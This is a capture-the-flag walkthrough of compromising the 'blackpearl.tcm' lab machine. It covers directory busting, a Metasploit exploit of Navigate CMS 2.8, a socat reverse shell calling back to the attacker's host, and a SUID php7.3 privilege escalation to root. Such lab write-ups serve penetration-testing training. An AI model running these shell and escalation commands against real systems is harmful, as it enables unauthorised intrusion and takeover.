
We perform a `nslookup` to find some domain name:

![](attachments/Pasted%20image%2020251127123602.png)

and we find this domain name so we put it to `/etc/hosts` with:

```bash
echo "192.168.126.135 blackpearl.tcm" >> /etc/hosts
```

and now if we visit `http://blackpearl.tcm` we find this page:

![](attachments/Pasted%20image%2020251127123721.png)

We perform a directory busting with this command:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
```

and we find a directory `navigate` so we go there and we find:

![](attachments/Pasted%20image%2020251127124006.png)

it is using the CMS `navigate version 2.8`.
Searching for an exploit I found this one from metasploit:

![](attachments/Pasted%20image%2020251127124124.png)

so I went to metasploit to use it:

![](attachments/Pasted%20image%2020251127124416.png)

and we get a shell:

![](attachments/Pasted%20image%2020251127124447.png)

I upgraded the shell using `socat`:

On Kali I ran this:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

and on the target machine I ran:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.126.129:4444
```

Then I ran `linpeas` on the target machine and after it finished and I was scanning through the results I found this:

![](attachments/Pasted%20image%2020251127133130.png)

which could lead to SUID privilege escalation. So I searched `GTFObins` and I found for `php` which I guessed could also be applicable to `php7.3`
So I ran:

```bash
cd /usr/bin
./php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

![](attachments/Pasted%20image%2020251127133550.png)

So we got root privileges and we can read the `flag.txt`:

![](attachments/Pasted%20image%2020251127133635.png)